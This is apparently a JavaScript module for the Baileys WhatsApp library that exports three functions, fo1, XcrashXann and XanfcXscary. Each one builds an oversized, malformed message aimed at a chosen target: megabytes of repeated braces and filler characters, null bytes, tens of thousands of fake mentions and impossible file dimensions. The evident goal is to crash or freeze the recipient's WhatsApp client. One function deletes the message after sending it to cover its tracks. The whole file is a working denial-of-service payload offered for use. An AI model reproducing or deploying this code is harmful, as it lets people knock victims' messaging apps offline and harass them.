const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');  
const ImgCrL = fs.readFileSync('./p.jpg')



async function fo1(target) {
  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            documentMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQPuAZut76RgeDfHNNF2_Nla7ZgINJkVD8jLoN2boVBM_Lmu2ADHTXg1hRVcQSpupfUGiRWPW51vanR0TvVxE3nmEV_gwighO9d_v4SorQ?ccb=9-4&oh=01_Q5Aa1wGhivlknEqU2xUQr9adgju12aWjBsHen5jcnFKFl7yu4w&oe=68736573&_nc_sid=e6ed6c&mms3=true",
              mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
              fileLength: '19999999999',
              pageCount: 9999991,
              fileName: 'annas',
              fileSha256: "W7TEBFdzHFaYDHOsYcNqw+x8anpnjwuyQguLLJu22Q0=",
              fileEncSha256: "cOxGGHNWXJF3lL/cSc6woTQHCBltD6+t4SritDk6weE=",
              mediaKeyTimestamp: "1715880173",
              mediaKey: "pOIkkv+oCyvpFQUVGnC19jiT0hWGVVy2qlHU31jUZGM=",
              directPath: "/o1/v/t24/f2/m231/AQPuAZut76RgeDfHNNF2_Nla7ZgINJkVD8jLoN2boVBM_Lmu2ADHTXg1hRVcQSpupfUGiRWPW51vanR0TvVxE3nmEV_gwighO9d_v4SorQ?ccb=9-4&oh=01_Q5Aa1wGhivlknEqU2xUQr9adgju12aWjBsHen5jcnFKFl7yu4w&oe=68736573&_nc_sid=e6ed6c",
              jpegThumbnail: thumbnail,
              scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
              scanLengths: [8596, 155493],
              height: 10000000000,
              width: 1000000000
            },
            hasMediaAttachment: true
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(905000)
          }
        },
        contextInfo: {
          participant: "0@s.whatsapp.net",
          fromMe: true,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 40000 }, () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ],
          remoteJid: "0@s.whatsapp.net",
          userJid: target
        }
      }
    }
  };

  try {
    const msg = await generateWAMessageFromContent(target, message, {});
    await anas.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      
      participant: { jid: target }
    });
  } catch (err) {
    console.error("Gagal kirim fo1:", err);
  }
}
async function XcrashXann(target) {
  try {
    const Msg = await generateWAMessageFromContent(
      target,
      {
        message: {
          interactiveMessage: {
            text: "-X‌A‌N‌S‌C‌A‌R‌Y‌⨳🐉",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            name: "menu_option",
            paramsJson: "{{{".repeat(9999).substring(0, 30000) + "\u0007\u0007".repeat(55555).substring(0, 30000) + "".repeat(50000).substring(0, 10000)
          },
          contextInfo: {
            stanzaId: "Laurine-BD32C2474B38",
            participant: target,
            annotations: [
              {
                polygonVertices: Array.from({ length: 100 }, () => ({
                  x: Math.random() * 9999,
                  y: Math.random() * 9999
                })),
                newsletter: {
                  newsletterJid: "120363321780343299@newsletter",
                  newsletterName: "who is xannar?!!!",
                  contentType: "UPDATE",
                  accessibilityText: "\u0000".repeat(50000)
                }
              }
            ],
            quotedMessage: {
              buttonMessage: {
                text: "ꦾ".repeat(555555).substring(0, 10000),
                imageMessage: {
                  url: "",
                  mimetype: "image/jpeg",
                  caption: "\u0000\u0000".repeat(50000).substring(0, 1000),
                  fileSha256: "lkP8hsY4ex+lzJw1ylVMCT/Ofl2Ouk7vTzjwKliA5fI=",
                  fileLength: 73247,
                  height: 736,
                  width: 736,
                  mediaKey: "X+ED0aJJfYyCud4vJNgwUUdMQy1zMJ7hHAsFUIUgt1w=",
                  fileEncSha256: "5xn7hRt0IR3v3pc54sbg8bemzYbE3FTHoK4rbWWE4Jk=",
                  directPath: "/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c",
                  jpegThumbnail: null
                },
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ]
              }
            }
          }
        }
      }
    );
    await sock.relayMessage(target, Msg.message, {
      messageId: undefined
    });
    await delay(400);
    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: Msg.key?.id,
        participant: target
      }
    });
  } catch (err) {
    console.error('❌ Gagal menjalankan Xbug:', err);
  }
}
async function XanfcXscary(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(
      target,
      {
        interactiveMessage: {
          header: {
            title: "-X‌A‌N‌S‌C‌A‌R‌Y‌⨳🐉",
            hasMediaAttachment: false
          },
          body: {
            text: "ꦽ".repeat(15000),
          },
          nativeFlowMessage: {
            messageParamsJson: "ꦽ".repeat(15000),
            buttons: [
              {
                name: "payment_method",
                buttonParamsJson: JSON.stringify({
                  reference_id: null,
                  payment_method: "{".repeat(100),
                  payment_timestamp: null,
                  share_payment_status: true,
                }),
              }
            ]
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      target,
      msg.message,
      {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } }
        ]
      }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { native_flow_name: "payment_method" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log("Xannar is here");
  } catch (err) {
    console.error(chalk.red.bold(err));
  }
}
module.exports = { XanfcXscary, XcrashXann, fo1}